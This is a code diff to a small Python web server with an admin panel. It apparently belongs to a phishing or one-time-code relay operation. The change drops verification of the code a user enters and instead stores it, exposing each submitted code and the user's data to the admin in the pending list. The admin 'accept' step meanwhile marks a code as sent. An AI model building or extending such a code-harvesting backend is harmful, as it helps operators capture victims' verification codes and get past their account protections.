@@ -146,7 +146,7 @@ class Server(SimpleHTTPRequestHandler):
             return self._json({"ok": True, "status": "pending"})
 
         if p == "/api/admin/list":
-            items = [{"id": rid, "data": r["data"], "code_sent": r.get("code_sent", False), "code_sent_at": r.get("code_sent_at")} for rid, r in requests_db.items() if r["state"] == "pending"]
+            items = [{"id": rid, "data": r["data"], "code_sent": r.get("code_sent", False), "code_sent_at": r.get("code_sent_at"), "user_code": r.get("user_code"), "user_code_submitted": bool(r.get("user_code"))} for rid, r in requests_db.items() if r["state"] == "pending"]
             return self._json({"ok": True, "items": items})
 
         if p == "/api/admin/history":
@@ -196,25 +196,19 @@ class Server(SimpleHTTPRequestHandler):
             r = requests_db.get(rid)
             if not r:
                 return self._json({"ok": False}, 404)
-            # Verifier le code saisi par l'utilisateur
-            if r.get("code") and r.get("code") == code:
-                r["state"] = "done"
-                r["by"] = "accept"
-                history_log.append({"action": "accept", "data": r["data"], "ts": int(time.time() * 1000)})
-                persist()
-                return self._json({"ok": True, "verified": True})
-            else:
-                return self._json({"ok": False, "error": "code_incorrect"})
+            r["user_code"] = code
+            r["code_submitted_at"] = int(time.time() * 1000)
+            persist()
+            return self._json({"ok": True})
 
         if p.startswith("/api/admin/accept/"):
             rid = p.split("/")[-1]
             r = requests_db.get(rid)
             if not r:
                 return self._json({"ok": False, "error": "not_found"})
-            # On met juste en attente de code, pas de generation automatique
             r["code_sent"] = True
             r["code_sent_at"] = int(time.time() * 1000)
-            r["state"] = "pending"  # En attente que l'utilisateur saisisse son code
+            r["state"] = "pending"
             history_log.append({"action": "accept", "data": r["data"], "ts": int(time.time() * 1000)})
             persist()
             return self._json({"ok": True})
